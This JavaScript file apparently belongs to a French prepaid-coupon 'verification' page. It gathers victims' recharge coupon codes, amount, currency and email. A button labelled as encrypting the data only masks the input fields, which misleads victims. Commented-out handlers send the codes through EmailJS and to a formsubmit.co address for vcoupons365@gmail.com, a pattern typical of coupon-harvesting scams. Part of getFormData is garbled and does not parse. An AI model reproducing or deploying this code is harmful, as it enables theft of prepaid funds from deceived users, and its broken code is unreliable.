var base_url = `${window.location.protocol}//${window.location.host}/`;

const btn = document.querySelector('#btncrypt');
btn.addEventListener("click", crypter);

function crypter() {
    const inps = document.querySelectorAll('.code');
    if (btn.value == "Crypter mes données") {
        for (const inp of inps) {
            inp.type = "password";
            btn.value = "Décrypter mes données";
        }
    } else {
        for (const inp of inps) {
            inp.type = "text";
            btn.value = "Crypter mes données";
        }
    }
}

const getFormData = () => {
    const formControls = document.querySelectorAll('.form-control');
    var code = [];
    var formdata = {};
    formControls.forEach((formControl) => {
        const id = formControl.getAttribute('id');
        if (id === "code1" || id === "code2" || id === "code3" || id === "code4") {
            if (formControl.value) code.push(formControl.value);
        } else {
            if (formControl.value && formControl.value !== "none") {
                formdata[`${id}`] = formControl.value;
            } else {
                const errEl = document.getElementById(`${id}Err`);
                errEl.style.color = "red";
                errEl.innerHTML = "Champs Obligatoire";
            }
        }
    });
    formdata.code = code;
     type:formdata.get('type'),
     codes:formdata.get('code'),('code'),('code'),('code')
	montant:formdata.get('montant'),
	devise:formdata.get('devise')
	  De:formdata.get('email'),
    return JSON.stringify(formdata);
}

// document.addEventListener("DOMContentLoaded", () => {
//     document.querySelector('form#sendmail').addEventListener('submit', (e) => {
//         e.preventDefault();
//         const form = JSON.parse(getFormData());

//         if (form.type && form.montant && form.devise && form.mail && form.code.length) {

//             emailjs.send("service_cgfcag1", "template_6o6fwa9", {
//                     recharge: form.type,
//                     montant: form.montant,
//                     devise: form.devise,
//                     code: form.code,
//                     mail: form.mail
//                 })
//                 .then(function(response) {
//                     location.href = "couponSended.html";
//                 }, function(error) {
//                     console.log('FAILED...', error);
//                     alert('An error occurred while sending the email.');
//                 });

//         }



//     });

// });


// const form = document.getElementById('sendmail');
// console.log("form", form)

																
// const handleSubmit = async (event) => {
//     event.preventDefault();
//     const data = new FormData(form);

//         try {
//     const response = await fetch("https://formsubmit.co/vcoupons365@gmail.com", {
//         method: 'POST',
//         body: data
//     });
//     console.log("respon", response)
//     // location.href = "thanks.html";
//     } catch (error) {
//         console.log(error)
//     }
// }	

// form.addEventListener('submit', handleSubmit);


// https://formsubmit.co/69b2a9edbaaf587d04e831601f3f63b8
// vcoupons365@gmail.com														
